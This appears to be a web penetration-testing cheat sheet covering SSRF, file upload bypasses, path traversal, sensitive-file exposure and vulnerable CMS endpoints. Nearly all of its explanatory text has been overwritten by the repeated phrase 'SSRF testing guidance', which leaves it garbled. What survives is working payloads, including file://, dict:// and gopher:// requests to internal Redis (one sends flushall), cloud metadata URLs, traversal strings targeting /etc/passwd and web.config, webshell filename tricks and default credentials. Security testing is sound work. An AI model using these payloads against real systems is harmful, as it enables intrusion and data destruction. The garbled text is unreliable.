# Web SSRF testing guidance - SSRF、SSRF testing guidance、SSRF testing guidance Checklist

> SSRF testing guidance: WooYun SSRF testing guidance | SSRF testing guidance web-file-infra.md（SSRF + SSRF testing guidance + Checklist + CMS/URL SSRF testing guidance）

## SSRF testing guidance、SSRFSSRF testing guidance

### 4.1 SSRF testing guidance

```
SSRFSSRF testing guidance: SSRF testing guidance,SSRF testing guidance
SSRF testing guidance: SSRF testing guidance -> SSRF testing guidance -> SSRF testing guidance -> SSRF testing guidance
```

### 4.2 SSRF testing guidance

- SSRF testing guidanceurlSSRF testing guidance
- SSRF testing guidance/SSRF testing guidance
- SSRF testing guidance/SSRF testing guidance
- SSRF testing guidanceURLSSRF testing guidance
- Webhook/SSRF testing guidance

### 4.3 SSRF testing guidance

```bash
# file:// - SSRF testing guidance
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - SSRF testing guidance/SSRF testing guidance
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - SSRF testing guidanceTCPSSRF testing guidance
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - SSRF testing guidance
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # SSRF testing guidance
```

### 4.4 SSRF testing guidance

```bash
# IPSSRF testing guidance
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNSSSRF testing guidance: SSRF testing guidanceIPSSRF testing guidance127.0.0.1
# SSRF testing guidance/302SSRF testing guidance: SSRF testing guidanceURLSSRF testing guidance
```

### 4.5 SSRF testing guidance

1. SSRF testing guidance: SSRF testing guidance/IP
2. SSRF testing guidance: SSRF testing guidancehttp/https
3. SSRF testing guidance: SSRF testing guidanceRFC1918SSRF testing guidance127.0.0.1
4. DNSSSRF testing guidance: SSRF testing guidanceIPSSRF testing guidance
5. SSRF testing guidance: SSRF testing guidance

---

## SSRF testing guidance、SSRF testing guidance

### 5.1 SSRF testing guidance

| SSRF testing guidance | SSRF testing guidance | SSRF testing guidance |
|-----|------|---------|
| IIS 6.0SSRF testing guidance | `shell.asp;.jpg`SSRF testing guidance | SSRF testing guidance |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`SSRF testing guidancePHP | SSRF testing guidance`/img.jpg/x.php` |
| ApacheSSRF testing guidance | `shell.php.xxx`SSRF testing guidance | SSRF testing guidance |
| SSRF testing guidance | WebshellSSRF testing guidance | SSRF testing guidance |
| SSRF testing guidance | SSRF testing guidance | SSRF testing guidanceURLSSRF testing guidance |

### 5.2 SSRF testing guidance

| SSRF testing guidance | SSRF testing guidance | SSRF testing guidance |
|-----|------|------|
| WebSSRF testing guidance | SSRF testing guidanceroot | SSRF testing guidance |
| SSRF testing guidance777SSRF testing guidance | SSRF testing guidance+SSRF testing guidance | SSRF testing guidance644/755 |
| SSRF testing guidance | SSRF testing guidance | SSRF testing guidanceWebSSRF testing guidance,SSRF testing guidance |
| SSRF testing guidanceIPSSRF testing guidance | SSRF testing guidance | IPSSRF testing guidance/VPN |

### 5.3 SSRF testing guidance

```bash
# SSRF testing guidance
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# SSRF testing guidance (SSRF testing guidance)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# SSRF testing guidance
8080 (Tomcat) | 9090 (SSRF testing guidance) | 3306 (MySQLSSRF testing guidance)
6379 (RedisSSRF testing guidance) | 27017 (MongoDBSSRF testing guidance)
```

### 5.4 Spring Boot ActuatorSSRF testing guidance

```bash
/actuator/env          # SSRF testing guidance(SSRF testing guidance)
/actuator/configprops  # SSRF testing guidance
/actuator/heapdump     # SSRF testing guidance(SSRF testing guidance)
/actuator/mappings     # SSRF testing guidanceURLSSRF testing guidance
```

---

## SSRF testing guidance、SSRF testing guidanceChecklist

### 6.1 SSRF testing guidance

- [ ] SSRF testing guidance(FCKeditor/eWebEditor/UEditor)
- [ ] SSRF testing guidanceJavaScriptSSRF testing guidance
- [ ] SSRF testing guidance: SSRF testing guidance/SSRF testing guidance/SSRF testing guidance/%00SSRF testing guidance/SSRF testing guidance
- [ ] SSRF testing guidanceContent-TypeSSRF testing guidanceimage/jpeg
- [ ] SSRF testing guidanceGIF89aSSRF testing guidance / SSRF testing guidance
- [ ] SSRF testing guidance,SSRF testing guidance
- [ ] SSRF testing guidance.htaccess/.user.iniSSRF testing guidance
- [ ] SSRF testing guidance,SSRF testing guidance
- [ ] SSRF testing guidance

### 6.2 SSRF testing guidance

- [ ] SSRF testing guidance(filename/path/file/url/download)
- [ ] SSRF testing guidance: `../../../../../etc/passwd`
- [ ] WindowsSSRF testing guidance: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URLSSRF testing guidance: `%2e%2e%2f` / SSRF testing guidance `%252e%252e%252f`
- [ ] UnicodeSSRF testing guidance: `%c0%ae%c0%ae/`
- [ ] SSRF testing guidance: `../etc/passwd%00.jpg`
- [ ] SSRF testing guidance: `/etc/passwd` / `file:///etc/passwd`

### 6.3 SSRF testing guidance

- [ ] SSRF testing guidance: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] SSRF testing guidance: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] SSRF testing guidance: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] SSRF testing guidance: `/.env` `/.env.production`
- [ ] SSRF testing guidance: `/phpinfo.php` `/info.php` `/test.php`
- [ ] SSRF testing guidance: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] SSRF testing guidance: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google HackingSSRF testing guidance

### 6.4 SSRFSSRF testing guidance

- [ ] SSRF testing guidanceURL/SSRF testing guidance/SSRF testing guidance
- [ ] SSRF testing guidancefile:///etc/passwdSSRF testing guidance
- [ ] SSRF testing guidance: http://127.0.0.1:port
- [ ] SSRF testing guidance: http://169.254.169.254/latest/meta-data/
- [ ] IPSSRF testing guidance: SSRF testing guidance/SSRF testing guidance/SSRF testing guidance
- [ ] DNSSSRF testing guidance/302SSRF testing guidance

---

## SSRF testing guidanceA: SSRF testing guidanceCMSSSRF testing guidance

| CMS/SSRF testing guidance | SSRF testing guidance | SSRF testing guidance | SSRF testing guidance |
|---------|---------|------|------|
| SSRF testing guidanceOA ezOffice | SSRF testing guidance | `/defaultroot/dragpage/upload.jsp` | %00SSRF testing guidance |
| SSRF testing guidance | SSRF testing guidance | `/oaerp/ui/sync/excelUpload.jsp` | SSRF testing guidanceJS+SSRF testing guidance |
| SSRF testing guidanceGSiS | SSRF testing guidance | `/kdgs/core/upload/upload.jsp` | SSRF testing guidance |
| SSRF testing guidanceepstar | SSRF testing guidance | `/epstar/servlet/RaqFileServer action=open&fileName=/../WEB-INF/web.xml` | SSRF testing guidance |
| SSRF testing guidanceOA | SSRF testing guidance | `/ctp.log` | SSRF testing guidance |


## SSRF testing guidanceC: SSRF testing guidanceURLSSRF testing guidance

```bash
# PHPSSRF testing guidance
/down.php filename=../../../etc/passwd
/pic.php url=[base64SSRF testing guidance]

# JSPSSRF testing guidance
/download.jsp path=../WEB-INF/web.xml
/servlet/RaqFileServer action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPXSSRF testing guidance
/DownLoad.aspx Accessory=../web.config
/download.ashx file=../../../web.config

# ResinSSRF testing guidance
/resin-doc/resource/tutorial/jndi-appconfig/test inputFile=/etc/passwd
```

---

> **SSRF testing guidance/SSRF testing guidance/SSRF testing guidanceCVE** → SSRF testing guidance [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTPSSRF testing guidance/WebSocket/OAuth** → SSRF testing guidance [web-modern-protocols.md](web-modern-protocols.md)

*SSRF testing guidanceWooYunSSRF testing guidance(88,636SSRF testing guidance)SSRF testing guidance | SSRF testing guidance*
